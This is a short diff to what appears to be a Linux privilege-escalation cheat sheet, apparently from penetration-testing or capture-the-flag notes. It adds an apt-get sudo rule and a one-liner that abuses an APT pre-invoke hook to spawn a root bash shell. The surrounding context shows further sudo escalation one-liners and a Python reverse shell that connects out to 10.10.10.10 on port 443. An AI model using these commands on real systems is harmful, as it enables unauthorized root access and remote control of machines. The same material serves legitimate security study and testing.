@@ -169,6 +169,7 @@ User www-data may run the following commands on <hostname>
 - (root) NOPASSWD: /usr/bin/rlwrap
 - (root) NOPASSWD: /usr/bin/xargs
 - (root) NOPASSWD: /usr/bin/anansi_util
+- (root) NOPASSWD: /usr/bin/apt-get
 - (root) NOPASSWD: /usr/bin/wget
 
 
@@ -281,6 +282,11 @@ sudo xargs -a /dev/null sh
 anansi_util
 ```
 sudo /home/anansi/bin/anansi_util manual /bin/bash  
+```
+
+apt-get
+```
+sudo apt-get update -o APT::Update::Pre-Invoke::=”/bin/bash -i”
 ```
 
 Wget
@@ -439,8 +445,6 @@ void main()
   system("ps");
 
   }
-
-
 ```
 Compile Binary & Add SUID Bit
 
@@ -624,7 +628,7 @@ s.connect(("10.10.10.10",443));
 os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/bash","-i"]);'
+p=subprocess.call(["/bin/bash","-i"]);
 
 // Replace the IP & Port 
 
